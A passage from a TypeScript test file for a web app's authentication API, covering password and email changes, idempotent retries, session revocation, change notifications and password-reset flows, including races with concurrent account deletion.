      `expected comparable timing between the two paths, got wrong-password=${wrongPasswordMedian}ms vs. no-such-email=${noSuchEmailMedian}ms (ratio ${ratio.toFixed(1)}x)`,
    );
  });
});

test("changing your password with the correct current password works, and only the new password logs in afterward", async () => {
  await withServer(async (baseUrl) => {
    const email = `change-pw-1-${Date.now()}@example.com`;
    const signupRes = await fetch(`${baseUrl}/api/auth/signup`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: "original-password" }),
    });
    const { token } = (await signupRes.json()) as { token: string };

    const changeRes = await fetch(`${baseUrl}/api/auth/password`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ currentPassword: "original-password", newPassword: "brand-new-password" }),
    });
    assert.equal(changeRes.status, 204);

    const oldLogin = await fetch(`${baseUrl}/api/auth/login`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: "original-password" }),
    });
    assert.equal(oldLogin.status, 401, "the old password must no longer work");

    const newLogin = await fetch(`${baseUrl}/api/auth/login`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: "brand-new-password" }),
    });
    assert.equal(newLogin.status, 200, "the new password must now work");
  });
});

/**
 * Round 1328: signup's own success invalidates the exact precondition a
 * retry re-checks -- once the account exists, the caller's own unchanged
 * request body (same email) no longer passes createUser's uniqueness
 * check. Without idempotency protection, a response lost in transit after
 * the server already created the account and issued a session made a
 * retry fail with a false 409 EMAIL_TAKEN for a signup that, the original
 * token matching below proves, already fully succeeded -- telling שלומי
 * her own just-chosen email is "already registered" with no indication
 * it's the account she just created. Same shape as PATCH /auth/password's
 * own round-1310 idempotency test just below.
 */
test("POST /auth/signup retried with the same idempotency key after the first attempt already succeeded replays the original response, instead of 409ing with EMAIL_TAKEN", async () => {
  await withServer(async (baseUrl) => {
    const email = `signup-idem-1-${Date.now()}@example.com`;
    const headers = { "content-type": "application/json", "x-idempotency-key": "signup-repro-key" };
    const body = JSON.stringify({ email, password: "correct-horse-battery" });

    const firstRes = await fetch(`${baseUrl}/api/auth/signup`, { method: "POST", headers, body });
    assert.equal(firstRes.status, 201);
    const first = (await firstRes.json()) as { user: { id: string }; token: string };

    const retryRes = await fetch(`${baseUrl}/api/auth/signup`, { method: "POST", headers, body });
    assert.equal(
      retryRes.status,
      201,
      "a retried signup with the same idempotency key must replay the original success, not 409 now that the account already exists",
    );
    const retry = (await retryRes.json()) as { user: { id: string }; token: string };
    assert.equal(retry.user.id, first.user.id, "the replayed response must be the exact same account, not a second one");
    assert.equal(retry.token, first.token);

    const loginRes = await fetch(`${baseUrl}/api/auth/login`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: "correct-horse-battery" }),
    });
    assert.equal(loginRes.status, 200, "exactly one account must genuinely have been created, not zero or two");
  });
});

/**
 * Round 1328: the exact counterpart to the test just above -- two SEPARATE
 * signup attempts (no idempotency key at all, or two different keys) for
 * the same email are two genuinely distinct requests, not a retry of one
 * already-succeeded request, so the second must still be rejected as a
 * real duplicate. This is the regression the fix above must never cause:
 * confirms withIdempotency's own `if (!key) return run()` early return
 * (and, with two distinct keys, two separate "done" rows) leaves this
 * route's pre-existing duplicate-email behavior completely unchanged.
 */
test("POST /auth/signup with no idempotency key, or two different keys, for the same email still genuinely rejects the second attempt as a real duplicate", async () => {
  await withServer(async (baseUrl) => {
    const email = `signup-idem-2-${Date.now()}@example.com`;
    const firstRes = await fetch(`${baseUrl}/api/auth/signup`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: "correct-horse-battery" }),
    });
    assert.equal(firstRes.status, 201);

    const secondRes = await fetch(`${baseUrl}/api/auth/signup`, {
      method: "POST",
      headers: { "content-type": "application/json", "x-idempotency-key": "signup-no-key-repro-2" },
      body: JSON.stringify({ email, password: "a-different-password" }),
    });
    assert.equal(secondRes.status, 409);
    assert.equal(((await secondRes.json()) as { code?: string }).code, "EMAIL_TAKEN");
  });
});

/**
 * Round 1310: this route's own success invalidates the exact precondition
 * (currentPassword verified against storedHash) a retry re-checks -- once
 * the password changes, the caller's own unchanged request body no longer
 * verifies against the new hash. Without idempotency protection, a
 * response lost in transit after the server already committed the change
 * made a retry fail with a false 401 INVALID_CURRENT_PASSWORD for a change
 * that, the new password working below proves, already fully succeeded.
 * Same shape as POST .../transfer-ownership's own round-1189 idempotency
 * test further down this file.
 */
test("PATCH /auth/password retried with the same idempotency key after the first attempt already succeeded replays the original response, instead of 401ing with a stale currentPassword", async () => {
  await withServer(async (baseUrl) => {
    const email = `change-pw-idem-1-${Date.now()}@example.com`;
    const signupRes = await fetch(`${baseUrl}/api/auth/signup`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: "original-password" }),
    });
    const { token } = (await signupRes.json()) as { token: string };

    const headers = { ...authHeaders(token), "x-idempotency-key": "change-password-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/auth/password`, {
      method: "PATCH",
      headers,
      body: JSON.stringify({ currentPassword: "original-password", newPassword: "brand-new-password" }),
    });
    assert.equal(firstRes.status, 204);

    const retryRes = await fetch(`${baseUrl}/api/auth/password`, {
      method: "PATCH",
      headers,
      body: JSON.stringify({ currentPassword: "original-password", newPassword: "brand-new-password" }),
    });
    assert.equal(
      retryRes.status,
      204,
      "a retried password change with the same idempotency key must replay the original success, not 401 now that currentPassword no longer matches the new hash",
    );

    const newLogin = await fetch(`${baseUrl}/api/auth/login`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: "brand-new-password" }),
    });
    assert.equal(newLogin.status, 200, "the password must genuinely have been changed exactly once, not twice or zero times");
  });
});

test("changing your password with the wrong current password is rejected, and the password stays unchanged", async () => {
  await withServer(async (baseUrl) => {
    const email = `change-pw-2-${Date.now()}@example.com`;
    const signupRes = await fetch(`${baseUrl}/api/auth/signup`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: "original-password" }),
    });
    const { token } = (await signupRes.json()) as { token: string };

    const changeRes = await fetch(`${baseUrl}/api/auth/password`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ currentPassword: "totally-wrong-password", newPassword: "brand-new-password" }),
    });
    assert.equal(changeRes.status, 401);
    assert.equal(((await changeRes.json()) as { code?: string }).code, "INVALID_CURRENT_PASSWORD");

    const originalStillWorks = await fetch(`${baseUrl}/api/auth/login`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: "original-password" }),
    });
    assert.equal(originalStillWorks.status, 200, "the original password must still work after a rejected change");
  });
});

/**
 * Regression test for a real bug: changing your password never revoked any
 * OTHER active session, defeating the standard security purpose of a
 * password change (e.g. a lost laptop, a borrowed phone, a leaked token
 * keeps working forever). The same revoke-by-user mechanism already existed
 * for account deletion (deleteAllSessionsForUser) -- this ports the same
 * idea, minus the one session making the change-password request itself,
 * which must stay valid so this exact response can still succeed.
 */
test("changing your password revokes every OTHER session, but the session making the change itself stays valid", async () => {
  await withServer(async (baseUrl) => {
    const email = `change-pw-revoke-${Date.now()}@example.com`;
    const signupRes = await fetch(`${baseUrl}/api/auth/signup`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: "original-password" }),
    });
    const { token: firstSessionToken } = (await signupRes.json()) as { token: string };

    const secondLoginRes = await fetch(`${baseUrl}/api/auth/login`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: "original-password" }),
    });
    const { token: secondSessionToken } = (await secondLoginRes.json()) as { token: string };

    const changeRes = await fetch(`${baseUrl}/api/auth/password`, {
      method: "PATCH",
      headers: authHeaders(firstSessionToken),
      body: JSON.stringify({ currentPassword: "original-password", newPassword: "brand-new-password" }),
    });
    assert.equal(changeRes.status, 204);

    const secondSessionMe = await fetch(`${baseUrl}/api/auth/me`, { headers: authHeaders(secondSessionToken) });
    assert.equal(secondSessionMe.status, 401, "the other, now-stale session must be rejected after the password change");

    const firstSessionMe = await fetch(`${baseUrl}/api/auth/me`, { headers: authHeaders(firstSessionToken) });
    assert.equal(firstSessionMe.status, 200, "the session that made the change-password request itself must stay valid");
  });
});

test("changing your password rejects a new password shorter than 8 characters, the same minimum signup enforces", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, `change-pw-3-${Date.now()}@example.com`);
    const changeRes = await fetch(`${baseUrl}/api/auth/password`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ currentPassword: "correct-horse-battery", newPassword: "short" }),
    });
    assert.equal(changeRes.status, 400);
    assert.equal(((await changeRes.json()) as { code?: string }).code, "VALIDATION_ERROR");
  });
});

test("changing your password requires a valid session, the same as any other authenticated route", async () => {
  await withServer(async (baseUrl) => {
    const res = await fetch(`${baseUrl}/api/auth/password`, {
      method: "PATCH",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ currentPassword: "whatever", newPassword: "brand-new-password" }),
    });
    assert.equal(res.status, 401);
    assert.equal(((await res.json()) as { code?: string }).code, "AUTH_REQUIRED");
  });
});

/**
 * Round 1252: this route used to send no notification anywhere once the
 * change succeeded -- round 1206 closed the identical gap for PATCH
 * /auth/email but never touched this route, despite the risk being
 * sharper here: an attacker who obtains the real current password (a
 * leaked/reused credential, not a stolen session) locks the real owner
 * out of every other session with zero visible signal. Confirms the real
 * EmailSender.send call reaches the account's own address.
 */
test("changing your password sends a real notification to your own address, when email is configured", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const email = `change-pw-notify-${Date.now()}@example.com`;
      const token = await signup(baseUrl, email);

      const changeRes = await fetch(`${baseUrl}/api/auth/password`, {
        method: "PATCH",
        headers: authHeaders(token),
        body: JSON.stringify({ currentPassword: "correct-horse-battery", newPassword: "brand-new-password", lang: "en" }),
      });
      assert.equal(changeRes.status, 204);

      assert.equal(emailSender.sentTo.length, 1, "exactly one notification must be sent");
      assert.equal(emailSender.sentTo[0].to, email, "the notification must go to the account's own address");
    },
    { emailSender },
  );
});

test("changing your password still succeeds, with no notification attempted, when no email provider is configured", async () => {
  const emailSender = createFakeEmailSender({ configured: false });
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl, `change-pw-notify-unconfigured-${Date.now()}@example.com`);
      const changeRes = await fetch(`${baseUrl}/api/auth/password`, {
        method: "PATCH",
        headers: authHeaders(token),
        body: JSON.stringify({ currentPassword: "correct-horse-battery", newPassword: "brand-new-password" }),
      });
      assert.equal(changeRes.status, 204, "the change itself must still work exactly as before this feature existed");
      assert.equal(emailSender.sentTo.length, 0, "no send should even be attempted when email isn't configured");
    },
    { emailSender },
  );
});

/**
 * Round 1199: `email` was otherwise write-once -- set once at signup and
 * never touched again, the one account field with no self-service fix: a
 * typo or an inaccessible provider left `DELETE /auth/account` (cascading
 * away every owned project) and re-registering as the only way out. Also
 * mirrors PATCH /auth/password's own confirmation requirement exactly
 * (requires the current password, not just the session token).
 */
test("changing your email with the correct current password works, and only the new email logs in afterward", async () => {
  await withServer(async (baseUrl) => {
    const oldEmail = `change-email-1-old-${Date.now()}@example.com`;
    const newEmail = `change-email-1-new-${Date.now()}@example.com`;
    const signupRes = await fetch(`${baseUrl}/api/auth/signup`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email: oldEmail, password: "correct-horse-battery" }),
    });
    const { token } = (await signupRes.json()) as { token: string };

    const changeRes = await fetch(`${baseUrl}/api/auth/email`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ currentPassword: "correct-horse-battery", email: newEmail }),
    });
    assert.equal(changeRes.status, 200);
    const { user } = (await changeRes.json()) as { user: { email: string } };
    assert.equal(user.email, newEmail, "the response must report the new email back");

    const oldLogin = await fetch(`${baseUrl}/api/auth/login`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email: oldEmail, password: "correct-horse-battery" }),
    });
    assert.equal(oldLogin.status, 401, "the old email must no longer log in");

    const newLogin = await fetch(`${baseUrl}/api/auth/login`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email: newEmail, password: "correct-horse-battery" }),
    });
    assert.equal(newLogin.status, 200, "the new email must now log in, with the SAME password, completely unaffected");
  });
});

test("changing your email with the wrong current password is rejected, and the email stays unchanged", async () => {
  await withServer(async (baseUrl) => {
    const originalEmail = `change-email-2-${Date.now()}@example.com`;
    const token = await signup(baseUrl, originalEmail);

    const changeRes = await fetch(`${baseUrl}/api/auth/email`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ currentPassword: "totally-wrong-password", email: "someone-else@example.com" }),
    });
    assert.equal(changeRes.status, 401);
    assert.equal(((await changeRes.json()) as { code?: string }).code, "INVALID_CURRENT_PASSWORD");

    const meRes = await fetch(`${baseUrl}/api/auth/me`, { headers: authHeaders(token) });
    const { user } = (await meRes.json()) as { user: { email: string } };
    assert.equal(user.email, originalEmail, "a rejected change must leave the original email in place");
  });
});

test("changing your email to one already registered to a DIFFERENT account is rejected with 409 EMAIL_TAKEN", async () => {
  await withServer(async (baseUrl) => {
    const takenEmail = `change-email-3-taken-${Date.now()}@example.com`;
    await signup(baseUrl, takenEmail);
    const token = await signup(baseUrl, `change-email-3-mine-${Date.now()}@example.com`);

    const changeRes = await fetch(`${baseUrl}/api/auth/email`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ currentPassword: "correct-horse-battery", email: takenEmail }),
    });
    assert.equal(changeRes.status, 409);
    assert.equal(((await changeRes.json()) as { code?: string }).code, "EMAIL_TAKEN");
  });
});

/**
 * Unlike PATCH /auth/password (which revokes every OTHER session, the
 * standard security purpose of a password change), PATCH /auth/email
 * deliberately does NOT: a changed email doesn't by itself invalidate
 * anything an existing session could already do, so there's no matching
 * security reason to sign out other devices for what's usually just a
 * correction. Pins this as the intended contract, not an oversight.
 */
test("changing your email does NOT revoke any other session, unlike changing your password", async () => {
  await withServer(async (baseUrl) => {
    const email = `change-email-4-${Date.now()}@example.com`;
    const firstSessionToken = await signup(baseUrl, email);

    const secondLoginRes = await fetch(`${baseUrl}/api/auth/login`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: "correct-horse-battery" }),
    });
    const { token: secondSessionToken } = (await secondLoginRes.json()) as { token: string };

    const changeRes = await fetch(`${baseUrl}/api/auth/email`, {
      method: "PATCH",
      headers: authHeaders(firstSessionToken),
      body: JSON.stringify({ currentPassword: "correct-horse-battery", email: `change-email-4-new-${Date.now()}@example.com` }),
    });
    assert.equal(changeRes.status, 200);

    const secondSessionMe = await fetch(`${baseUrl}/api/auth/me`, { headers: authHeaders(secondSessionToken) });
    assert.equal(secondSessionMe.status, 200, "the other session must stay valid -- an email change must never revoke other sessions");
  });
});

/**
 * Round 1206: this route used to send no notification anywhere once the
 * change succeeded, the one sensitive auth action in this file with no
 * matching email (unlike the login-code and forgot-password routes,
 * which both notify the account holder). Confirms the real
 * EmailSender.send call reaches the OLD address, not the new one, and
 * that the body actually names the new address so the real owner can
 * tell at a glance whether it's legitimate.
 */
test("changing your email sends a real notification to the OLD address, naming the new one, when email is configured", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const oldEmail = `change-email-notify-old-${Date.now()}@example.com`;
      const newEmail = `change-email-notify-new-${Date.now()}@example.com`;
      const token = await signup(baseUrl, oldEmail);

      const changeRes = await fetch(`${baseUrl}/api/auth/email`, {
        method: "PATCH",
        headers: authHeaders(token),
        body: JSON.stringify({ currentPassword: "correct-horse-battery", email: newEmail, lang: "en" }),
      });
      assert.equal(changeRes.status, 200);

      assert.equal(emailSender.sentTo.length, 1, "exactly one notification must be sent");
      assert.equal(emailSender.sentTo[0].to, oldEmail, "the notification must go to the OLD address, not the one being switched to");
      assert.match(emailSender.sentTo[0].text, new RegExp(newEmail.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")), "the body must name the real new address");
    },
    { emailSender },
  );
});

test("changing your email still succeeds, with no notification attempted, when no email provider is configured", async () => {
  const emailSender = createFakeEmailSender({ configured: false });
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl, `change-email-notify-unconfigured-${Date.now()}@example.com`);
      const changeRes = await fetch(`${baseUrl}/api/auth/email`, {
        method: "PATCH",
        headers: authHeaders(token),
        body: JSON.stringify({ currentPassword: "correct-horse-battery", email: `change-email-notify-unconfigured-new-${Date.now()}@example.com` }),
      });
      assert.equal(changeRes.status, 200, "the change itself must still work exactly as before this feature existed");
      assert.equal(emailSender.sentTo.length, 0, "no send should even be attempted when email isn't configured");
    },
    { emailSender },
  );
});

test("resubmitting your own current email as the 'new' email is a no-op that sends no notification", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const email = `change-email-notify-noop-${Date.now()}@example.com`;
      const token = await signup(baseUrl, email);
      const changeRes = await fetch(`${baseUrl}/api/auth/email`, {
        method: "PATCH",
        headers: authHeaders(token),
        body: JSON.stringify({ currentPassword: "correct-horse-battery", email }),
      });
      assert.equal(changeRes.status, 200);
      assert.equal(emailSender.sentTo.length, 0, "re-submitting the exact same email is a no-op -- nothing to alert anyone about");
    },
    { emailSender },
  );
});

/**
 * A failed notification send must never undo or block an already-
 * successful, already-committed email change -- mirrors the
 * forgot-password route's own swallowed-send contract for the identical
 * reason (surfacing it here would make a security side effect look like
 * the primary request failed, when the actual account change already
 * went through).
 */
test("a failed notification send never fails the email-change request itself -- the change already succeeded", async () => {
  const emailSender = createFakeEmailSender({ failWith: new Error("simulated provider outage") });
  await withServer(
    async (baseUrl) => {
      const oldEmail = `change-email-notify-fail-${Date.now()}@example.com`;
      const newEmail = `change-email-notify-fail-new-${Date.now()}@example.com`;
      const token = await signup(baseUrl, oldEmail);
      const changeRes = await fetch(`${baseUrl}/api/auth/email`, {
        method: "PATCH",
        headers: authHeaders(token),
        body: JSON.stringify({ currentPassword: "correct-horse-battery", email: newEmail }),
      });
      assert.equal(changeRes.status, 200, "the response must still report success -- the email change itself already succeeded");
      const { user } = (await changeRes.json()) as { user: { email: string } };
      assert.equal(user.email, newEmail, "the change must have actually gone through despite the notification failing");
    },
    { emailSender },
  );
});

test("changing your email requires a valid session, the same as any other authenticated route", async () => {
  await withServer(async (baseUrl) => {
    const res = await fetch(`${baseUrl}/api/auth/email`, {
      method: "PATCH",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ currentPassword: "whatever", email: "someone@example.com" }),
    });
    assert.equal(res.status, 401);
    assert.equal(((await res.json()) as { code?: string }).code, "AUTH_REQUIRED");
  });
});

test("changing your email rejects a malformed email address with VALIDATION_ERROR", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, `change-email-5-${Date.now()}@example.com`);
    const changeRes = await fetch(`${baseUrl}/api/auth/email`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ currentPassword: "correct-horse-battery", email: "not-an-email" }),
    });
    assert.equal(changeRes.status, 400);
    assert.equal(((await changeRes.json()) as { code?: string }).code, "VALIDATION_ERROR");
  });
});

/**
 * Regression test for a real bug: PATCH /auth/password's own writes
 * (updatePasswordHash + deleteOtherSessionsForUser) ran unconditionally
 * after its two genuine scrypt awaits (verifyPassword, then hashPassword --
 * both offloaded to libuv's threadpool, see auth/password.ts's own comment,
 * the same genuine await the "two concurrent signups" test above relies on
 * for real overlap with no artificial gate needed). A concurrent DELETE
 * /auth/account using the SAME still-valid token could delete the user row
 * entirely while PATCH was still parked on one of those awaits -- both
 * writes below would then silently affect zero rows, yet the handler still
 * responded 204 as if the password change had succeeded on an account that
 * no longer existed.
 */
test("changing your password while the same account is concurrently deleted must not report success on a change that was never written", async () => {
  await withServer(async (baseUrl) => {
    const email = `change-pw-vs-delete-${Date.now()}@example.com`;
    const token = await signup(baseUrl, email);
    // A couple of throwaway requests first, so the HTTP client's own
    // connection machinery has settled before the timed race below --
    // otherwise first-connection setup jitter can skew which request's
    // handler genuinely starts first.
    await fetch(`${baseUrl}/api/auth/me`, { headers: authHeaders(token) });
    await fetch(`${baseUrl}/api/auth/me`, { headers: authHeaders(token) });

    const patchPromise = fetch(`${baseUrl}/api/auth/password`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ currentPassword: "correct-horse-battery", newPassword: "brand-new-password" }),
    });
    // DELETE has no genuine await of its own in this scenario (no projects,
    // no live WhatsApp connection), so it needs a short head start for its
    // synchronous session-revocation to land genuinely inside one of
    // PATCH's own scrypt awaits, not before PATCH's handler has even begun.
    await new Promise((resolve) => setTimeout(resolve, 20));
    const deleteRes = await fetch(`${baseUrl}/api/auth/account`, { method: "DELETE", headers: authHeaders(token) });
    assert.equal(deleteRes.status, 204);

    const patchRes = await patchPromise;
    assert.notEqual(patchRes.status, 204, "must not report success once the account it targets no longer exists");
    assert.equal(patchRes.status, 401);
    assert.equal(((await patchRes.json()) as { code?: string }).code, "USER_NOT_FOUND");

    const reSignupRes = await fetch(`${baseUrl}/api/auth/signup`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: "whatever-password" }),
    });
    assert.equal(reSignupRes.status, 201, "the email must be free to re-register -- the account was genuinely deleted, not left in some half-updated state");
  });
});

/**
 * The "forgot password" flow (routes/auth.ts): until now a forgotten (not
 * just mistyped-at-signup) password left an account permanently
 * inaccessible -- see AuthScreen.tsx's own comment on this exact gap.
 * These tests exercise the whole real server-side flow -- email send,
 * token issuance, reset, session revocation -- with a fake, inspectable
 * EmailSender double, the same convention the login-code tests above
 * already use for the identical kind of flow.
 */
test("forgot-password emails a real reset link, and following it with a new password actually changes the password and revokes every existing session", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const email = "dana@example.com";
      const token = await signup(baseUrl, email);
      // A second, independent session for the same account, to confirm the
      // reset revokes EVERY session, not just the one that happened to
      // request it (there is no "request it" session here at all -- forgot
      // password is deliberately unauthenticated -- so this just proves
      // the blanket revocation, the same as DELETE /auth/account's own).
      const secondLoginRes = await fetch(`${baseUrl}/api/auth/login`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "correct-horse-battery" }),
      });
      const { loginCodeId: secondLoginCodeId } = (await secondLoginRes.json()) as { loginCodeId: string };
      const secondCode = emailSender.sentTo[0]!.text.match(/\d{6}/)![0];
      const secondVerifyRes = await fetch(`${baseUrl}/api/auth/login/verify-code`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ loginCodeId: secondLoginCodeId, code: secondCode }),
      });
      const { token: secondToken } = (await secondVerifyRes.json()) as { token: string };

      const forgotRes = await fetch(`${baseUrl}/api/auth/forgot-password`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, lang: "en" }),
      });
      assert.equal(forgotRes.status, 200);
      assert.deepEqual(await forgotRes.json(), { sent: true });

      // The second login above (configured EmailSender) also sent its own
      // login-code email to this same address -- find the reset email
      // specifically (it carries a link, not a 6-digit code) rather than
      // assume it's the only one sent so far.
      const resetEmail = emailSender.sentTo.find((e) => /https?:\/\//.test(e.text));
      assert.ok(resetEmail, "expected one of the sent emails to contain a real reset link");
      assert.equal(resetEmail!.to, email);
      const resetUrl = resetEmail!.text.match(/https?:\/\/\S+/)?.[0];
      assert.ok(resetUrl, "the email body must contain a real reset link");
      const resetToken = new URL(resetUrl!).searchParams.get("resetToken");
      assert.ok(resetToken, "the reset link must carry a resetToken query param");

      const resetRes = await fetch(`${baseUrl}/api/auth/reset-password`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ token: resetToken, newPassword: "brand-new-password" }),
      });
      assert.equal(resetRes.status, 204);

      // Both of this account's pre-reset sessions must now be dead.
      const meWithOldTokenRes = await fetch(`${baseUrl}/api/auth/me`, { headers: authHeaders(token) });
      assert.equal(meWithOldTokenRes.status, 401);
      const meWithSecondTokenRes = await fetch(`${baseUrl}/api/auth/me`, { headers: authHeaders(secondToken) });
      assert.equal(meWithSecondTokenRes.status, 401);

      // The old password must no longer work; the new one must.
      const loginWithOldRes = await fetch(`${baseUrl}/api/auth/login`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "correct-horse-battery" }),
      });
      assert.equal(loginWithOldRes.status, 401);
      const loginWithNewRes = await fetch(`${baseUrl}/api/auth/login`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "brand-new-password" }),
      });
      assert.equal(loginWithNewRes.status, 200);

      // The now-used reset token must be rejected on a second attempt --
      // single-use, not reusable until its own TTL.
      const reuseRes = await fetch(`${baseUrl}/api/auth/reset-password`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ token: resetToken, newPassword: "yet-another-password" }),
      });
      assert.equal(reuseRes.status, 401);
      assert.equal(((await reuseRes.json()) as { code?: string }).code, "RESET_TOKEN_INVALID");
    },
    { emailSender },
  );
});

/**
 * Round 1265: this route used to send no notification anywhere once the
 * reset succeeded -- round 1252 closed the identical gap for PATCH
 * /auth/password but never touched this route, despite the risk being
 * sharper here: deleteAllSessionsForUser kills EVERY session on the
 * account (not just "other" ones), and this route is reachable by anyone
 * holding a leaked/intercepted reset link, not just someone who already
 * knows the current password. Confirms the real EmailSender.send call
 * reaches the account's own address. Inserts the reset token row
 * directly (same technique the garbage/expired-token test above uses),
 * so this test isn't itself exercising forgot-password's own email.
 */
test("resetting your password sends a real notification to your own address, when email is configured", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl, db) => {
      const email = `reset-pw-notify-${Date.now()}@example.com`;
      await signup(baseUrl, email);
      emailSender.sentTo.length = 0; // The login-code email signup itself sent -- only the reset notification matters here.

      const token = "fresh-raw-reset-token";
      const tokenHash = createHash("sha256").update(token).digest("hex");
      db.prepare(
        "INSERT INTO password_reset_tokens (id, userId, tokenHash, expiresAt, createdAt) SELECT ?, id, ?, ?, ? FROM users WHERE email = ?",
      ).run(randomUUID(), tokenHash, new Date(Date.now() + 60 * 60 * 1000).toISOString(), new Date().toISOString(), email);

      const resetRes = await fetch(`${baseUrl}/api/auth/reset-password`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ token, newPassword: "brand-new-password", lang: "en" }),
      });
      assert.equal(resetRes.status, 204);

      assert.equal(emailSender.sentTo.length, 1, "exactly one notification must be sent");
      assert.equal(emailSender.sentTo[0].to, email, "the notification must go to the account's own address");
      // Round 1311: this route's own notification used to be a verbatim
      // copy of PATCH /auth/password's "someone else knew your previous
      // password" text, which is wrong here -- this flow requires no
      // current password at all, only a token from an emailed link, so a
      // reset actually caused by a compromised email inbox must point the
      // victim at securing their email, not at a leaked Forge AI password.
      assert.match(
        emailSender.sentTo[0].text,
        /reset using a password-reset link/,
        "the reset-password notification must describe how this route is actually reached (a reset link), not PATCH /auth/password's own current-password wording",
      );
      assert.doesNotMatch(
        emailSender.sentTo[0].text,
        /knew your previous password/,
        "the reset-password notification must not claim a leaked password caused this reset, since no password was required to trigger it",
      );
    },
    { emailSender },
  );
});

test("resetting your password still succeeds, with no notification attempted, when no email provider is configured", async () => {
  const emailSender = createFakeEmailSender({ configured: false });
  await withServer(
    async (baseUrl, db) => {
      const email = `reset-pw-notify-unconfigured-${Date.now()}@example.com`;
      await signup(baseUrl, email);

      const token = "fresh-raw-reset-token-unconfigured";
      const tokenHash = createHash("sha256").update(token).digest("hex");
      db.prepare(
        "INSERT INTO password_reset_tokens (id, userId, tokenHash, expiresAt, createdAt) SELECT ?, id, ?, ?, ? FROM users WHERE email = ?",
      ).run(randomUUID(), tokenHash, new Date(Date.now() + 60 * 60 * 1000).toISOString(), new Date().toISOString(), email);

      const resetRes = await fetch(`${baseUrl}/api/auth/reset-password`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ token, newPassword: "brand-new-password" }),
      });
      assert.equal(resetRes.status, 204, "the reset itself must still work exactly as before this feature existed");
      assert.equal(emailSender.sentTo.length, 0, "no send should even be attempted when email isn't configured");
    },
    { emailSender },
  );
});

/**
 * Regression test for a real bug (round 1024): POST /auth/reset-password's
 * own existence check (findUserById) ran BEFORE its one genuine scrypt
 * await (hashPassword -- offloaded to libuv's threadpool, see
 * auth/password.ts's own comment), the exact inverted ordering round 539
 * already fixed for the sibling route PATCH /auth/password (see that
 * route's own race test above). A concurrent DELETE /auth/account using
 * the same still-valid session token could delete the user row entirely
 * while reset-password was parked on that await -- both writes below it
 * would then silently affect zero rows, yet the handler still responded
 * 204 as if the reset had succeeded on an account that no longer existed.
 */
test("resetting your password via the forgot-password link while the same account is concurrently deleted must not report success on a change that was never written", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const email = `reset-pw-vs-delete-${Date.now()}@example.com`;
      const token = await signup(baseUrl, email);
      // A couple of throwaway requests first, matching the PATCH-vs-DELETE
      // race test's own convention above -- settles the HTTP client's
      // connection machinery before the timed race below.
      await fetch(`${baseUrl}/api/auth/me`, { headers: authHeaders(token) });
      await fetch(`${baseUrl}/api/auth/me`, { headers: authHeaders(token) });

      const forgotRes = await fetch(`${baseUrl}/api/auth/forgot-password`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, lang: "en" }),
      });
      assert.equal(forgotRes.status, 200);
      const resetEmail = emailSender.sentTo.find((e) => /https?:\/\//.test(e.text));
      assert.ok(resetEmail, "expected one of the sent emails to contain a real reset link");
      const resetUrl = resetEmail!.text.match(/https?:\/\/\S+/)?.[0];
